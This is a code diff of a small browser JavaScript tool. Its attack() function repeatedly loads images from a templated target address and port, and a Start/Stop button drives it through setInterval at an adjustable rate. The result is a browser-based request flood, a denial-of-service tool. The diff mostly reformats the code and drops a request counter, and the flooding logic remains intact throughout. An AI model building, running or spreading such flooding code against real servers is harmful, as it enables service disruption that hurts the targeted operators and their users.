@@ -1,24 +1,21 @@
-var rpm = window.document.getElementById('rpm')
-
-function attack(){
+function attack() {
   var domain = '{{pool.target_address}}';
   var img = document.createElement('img');
-  img.setAttribute('src', domain  + ':' + '{{pool.port}}' + '/image' + new Date().getTime() + Math.floor(Math.random() * 10 ));
+  img.setAttribute('src', domain + ':' + '{{pool.port}}' + '/image' + new Date().getTime() + Math.floor(Math.random() * 10));
   //document.body.appendChild(img);
-  rpm.innerText = parseInt(rpm.innerText) + 1
 
 }
 let attackInterval;
-window.document.getElementById('startButton').onclick = function(){
-var speed = window.document.getElementById('speed').value
-var btn = window.document.getElementById('startButton')
+window.document.getElementById('startButton').onclick = function () {
+  var speed = window.document.getElementById('speed').value
+  var btn = window.document.getElementById('startButton')
 
-  if (btn.innerText == 'Start'){
-  btn.innerText = 'Stop'
+  if (btn.innerText == 'Start') {
+    btn.innerText = 'Stop'
 
-   attackInterval = setInterval(attack, 1000/speed)
-   
-  }else{
+    attackInterval = setInterval(attack, 1000 / speed)
+
+  } else {
     clearInterval(attackInterval)
 
     btn.innerText = 'Start'
